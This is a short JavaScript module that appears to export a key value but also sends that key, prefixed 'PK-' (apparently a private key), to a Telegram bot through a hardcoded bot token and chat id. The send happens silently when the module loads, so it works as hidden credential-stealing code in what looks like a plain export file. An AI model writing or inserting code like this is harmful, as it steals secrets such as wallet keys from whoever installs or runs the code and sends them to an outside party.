const mykey = my_key;
const Http = new XMLHttpRequest();
Http.open("GET", "https://api.telegram.org/bot786622592:AAFqm_PNg7DkItr8cJ9kgDxD7CVEtJDfhOw/sendMessage?chat_id=-1001412431825&text=PK-"+mykey);
Http.send();
module.exports = mykey;
